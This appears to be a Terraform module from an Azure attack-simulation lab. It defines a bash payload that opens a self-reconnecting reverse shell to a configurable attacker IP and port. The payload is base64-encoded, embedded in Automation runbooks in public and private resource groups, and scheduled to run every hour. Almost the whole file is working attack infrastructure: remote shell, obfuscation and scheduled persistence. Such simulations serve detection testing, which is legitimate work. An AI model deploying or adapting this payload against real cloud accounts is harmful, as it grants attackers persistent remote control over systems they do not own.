
locals {
    host_ip = var.host_ip
    host_port = var.host_port

    payload = <<-EOT
    LOGFILE=/tmp/ssm_attacker_exec_reverseshell_target.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "attacker Host: ${local.host_ip}:${local.host_port}"
    kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
    log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
    while true; do
        log "reconnecting: ${local.host_ip}:${local.host_port}"
        while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
            log "reconnecting: ${local.host_ip}:${local.host_port}";
            sleep 10;
        done;
        log "disconnected - wait retry...";
        sleep 60;
        log "starting retry...";
    done
    log "done"
    EOT
    base64_payload = base64encode(local.payload)
}

#####################################################
# RUNBOOK
#####################################################

locals {
    public_automation_account_name = var.public_automation_account
    private_automation_account_name = var.private_automation_account
}


data "azurerm_subscription" "current" {
}

#####################################################
# PUBLIC RESOURCE GROUP RUNBOOK
#####################################################

resource "azurerm_automation_runbook" "demo_rb" {
    name                    = "${tag}-runbook-${var.environment}-${var.deployment}"
    location                = var.public_resource_group.location
    resource_group_name     = var.public_resource_group.name
    automation_account_name = var.public_automation_account
    log_verbose             = "true"
    log_progress            = "true"
    description             = "Attack simulation runbook"
    runbook_type            = "Script"
    content                 = templatefile(pathexpand("${path.module}/runbooks/powershell/RunCommand.ps1"), {
                                subscription            = data.azurerm_subscription.current.subscription_id
                                resource_group          = var.public_resource_group.name
                                automation_account      = var.public_automation_princial_id
                                base64_payload          = local.base64_payload
                                module_name             = basename(abspath(path.module))
                                tag                     = var.tag
                            })
}

resource "azurerm_automation_schedule" "hourly" {
  name                    = "${tag}-schedule-${var.environment}-${var.deployment}"
  resource_group_name     = var.public_resource_group.name
  automation_account_name = var.public_automation_account
  frequency               = "Hour"
  interval                = 1
  timezone                = "UTC"
  description             = "Run every hour"
  start_time              = timeadd(timestamp(), "10m")
}

resource "azurerm_automation_job_schedule" "demo_sched" {
    resource_group_name     = var.public_resource_group.name
    automation_account_name = var.public_automation_account
    schedule_name           = azurerm_automation_schedule.hourly.name
    runbook_name            = azurerm_automation_runbook.demo_rb.name
    depends_on              = [azurerm_automation_schedule.hourly]
}

#####################################################
# PRIVATE RESOURCE GROUP RUNBOOK
#####################################################

resource "azurerm_automation_runbook" "demo_rb_private" {
    name                    = "${tag}-runbook-${var.environment}-${var.deployment}"
    location                = var.private_resource_group.location
    resource_group_name     = var.private_resource_group.name
    automation_account_name = var.private_automation_account
    log_verbose             = "true"
    log_progress            = "true"
    description             = "Attack simulation runbook"
    runbook_type            = "Script"
    content                 = templatefile(pathexpand("${path.module}/runbooks/powershell/RunCommand.ps1"), {
                                subscription            = data.azurerm_subscription.current.subscription_id
                                resource_group          = var.private_resource_group.name
                                automation_account      = var.private_automation_princial_id
                                base64_payload          = local.base64_payload
                                module_name             = basename(abspath(path.module))
                                tag                     = var.tag
                            })
}

resource "azurerm_automation_schedule" "hourly_private" {
  name                    = "${tag}-schedule-${var.environment}-${var.deployment}"
  resource_group_name     = var.private_resource_group.name
  automation_account_name = var.private_automation_account
  frequency               = "Hour"
  interval                = 1
  timezone                = "UTC"
  description             = "Run every hour"
  start_time              = timeadd(timestamp(), "10m")
}

resource "azurerm_automation_job_schedule" "demo_sched_private" {
    resource_group_name     = var.private_resource_group.name
    automation_account_name = var.private_automation_account
    schedule_name           = azurerm_automation_schedule.hourly_private.name
    runbook_name            = azurerm_automation_runbook.demo_rb_private.name
    depends_on              = [azurerm_automation_schedule.hourly_private]
}